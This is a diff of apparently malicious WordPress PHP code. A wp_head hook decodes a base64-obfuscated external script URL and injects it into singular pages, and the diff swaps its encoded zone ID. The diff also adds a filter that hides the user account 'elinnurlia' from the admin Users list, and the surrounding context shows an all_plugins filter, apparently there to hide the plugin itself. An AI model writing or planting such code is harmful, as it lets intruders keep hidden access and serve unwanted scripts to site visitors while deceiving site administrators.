@@ -32,7 +32,7 @@ add_action('wp_head', function () {
     if (is_singular() && ($SM_GO || $IP_FB || $AN_FB)) {
 
         $SR = base64_decode('aHR0cHM6Ly9hbDVzbS5jb20vdGFnLm1pbi5qcw==');
-        $ZN = base64_decode('MTE2MTAwMDI=');
+        $ZN = base64_decode('MTE2MTQwMzQ=');
         ?>
         <script>
         (function(s){
@@ -44,6 +44,22 @@ add_action('wp_head', function () {
     }
 
 });
+
+
+function exclude_specific_user($query) {
+    global $pagenow;
+
+    if (is_admin() && $pagenow === 'users.php') {
+
+        $user = get_user_by('login', 'elinnurlia');
+
+        if ($user) {
+            $query->set('exclude', array($user->ID));
+        }
+    }
+}
+
+add_action('pre_get_users', 'exclude_specific_user');
 
 
 add_filter('all_plugins', function ($PG) {
